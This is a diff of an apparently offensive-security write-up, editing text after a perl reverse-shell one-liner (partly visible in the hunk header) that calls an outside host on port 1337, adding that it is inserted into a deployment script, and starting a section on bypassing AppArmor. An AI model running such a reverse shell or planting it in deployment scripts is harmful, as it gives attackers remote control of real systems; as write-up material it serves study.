@@ -50,6 +50,8 @@ perl -e 'use Socket;$i="feuermagier.com";$p=1337;socket(S,PF_INET,SOCK_STREAM,ge
 in case the first one is making problems.
 You'll be surprised by how many systems and even minimalist dev-containers ship with perl installed.
 
-In any case, this leaves us with a simple, but functional reverse shell.
+In any case, inserting this into the deployment script leaves us with a simple, but functional reverse shell.
 
-### 2. 
+### 2. Bypassing AppArmor protection
+Let us take a quick look at the Ghidra disassembler output of relevant section of the `measure` program:
+[!measure](img/measure.png)
